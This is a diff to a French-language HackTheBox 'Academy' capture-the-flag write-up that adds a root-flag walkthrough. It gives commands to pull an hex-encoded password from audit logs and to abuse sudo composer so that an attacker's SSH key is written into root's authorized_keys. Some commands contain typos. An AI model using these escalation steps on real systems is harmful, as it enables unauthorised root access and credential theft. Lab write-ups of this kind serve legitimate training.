@@ -2,17 +2,24 @@
 
 ## Sommaire
 
+#### User Flag
 * Lancement
 * Connexion
 * Exploitation
 
+#### Root Flag
+* Analyse SELinux
+* Login user : mrb3n
+* Listing avaible sudo commands
+* exploit composer
+* Connection root
 ## Lancement
 
 ### Nmap :
 
-Nmap : 
+Nmap :
 ```bash
-nmap -A 10.10.10.215 
+nmap -A 10.10.10.215
 ```
 Results :
 ```
@@ -21,7 +28,7 @@ Host is up (0.087s latency).
 Not shown: 997 closed ports
 PORT     STATE SERVICE     VERSION
 22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
 |   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
 |_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
@@ -90,7 +97,7 @@ Se connecter avec l'utilisateur créée
 
 ## Exploitation
 
-### Lien trouvé 
+### Lien trouvé
 `http://dev-staging-01.academy.htb/`
 
 En aspectant la page sur laquelle on tombe, on peut voir que le serveur utiliser `Laravel` et que la ligne `APP_KEY` n'est pas masqué.
@@ -137,11 +144,11 @@ ls /home
 
 On remarque un utilisateur que l'on a déjà croisé sur la page `admin.php`.
 
-On se connecte 
+On se connecte
 ```
 su nomdelutilisateur
 +
-le mot de passe 
+le mot de passe
 ```
 
 Upgrade à nouveau le SHELL
@@ -152,5 +159,78 @@ Upgrade à nouveau le SHELL
 locate user.txt
 ```
 
-## Ressources 
+------------
+# ROOT FLAG
+
+
+### Analyse SELinux
+
+Recuperer l'uid du user actuel
+``
+id
+``
+`
+uid=1002(cry0l1t3) ....
+`
+```
+cd /var/log/audit
+cat * | grep 'comm="su"' | grep uid=1002
+```
+Récupérer la `valeur de data` et la décrypté via un décodeur hexa to txt
+``
+Data coresspond au parramètre de la commande qui suit 'comm='; 
+cette valeur est encrypté en Hexadécimale
+``
+Le mot de passe de la session mrb3n est le résultat du décryptage
+
+### Login user : mrb3n
+Utiliser le mdp précèdemment découvert pour se log a la session de mrb3n
+``
+su mrb3n 
+``
+
+###  Listing avaible sudo commands
+``Sudo -l``
+On voie la ligne ci desosus qui signifie que l'on peut utiliser la commande **sudo composer**
+>(ALL) /usb/bin/composer
+
+### exploit composer
+Localiser et ce déplacer dans un fichier dans le quel nous avons tous les droits
+```
+ls -Ral | grep drwx | mrb3n 2>/dev/null
+cd X
+```
+
+On peut voir que dans le dossier X nous avons les droit rwx
+Puis nous allons crée le script qui nous permet de faire une connection root en ssh via composer
+```
+TF=$(mktemp -d)
+vim $TF/composer.json
+```
+Fichier composer.json :
+``
+echo '{"scripts":{"SSH":"{Clé_RSA}" >> /root/.ssh/authorized_keys}}' 
+``
+
+Pour générer votre {Clé_RSA}, **depuis votre machine Hôte** :
+```
+ssh-keygen
+cd /home/{username}/.ssh
+cat id_rsa.pub
+Copier tout le résultat a l'exception du {username}@{host} qui se trouve a la fin
+Remplacer {Clé_RSA} par votre clé rsa
+```
+Puis executer le script, **sur la machine cible** 
+``sudo composer --working-dir=$TF run-script SSH``
+
+### Connection root
+Depuis votre machine hôte, connectez vous en ssh sur la machine cible 
+``ssh -i id_rsa root@academy.htb``
+
+### Trouver le flag root
+
+``
+locate root.txt
+``
+## Ressources
 
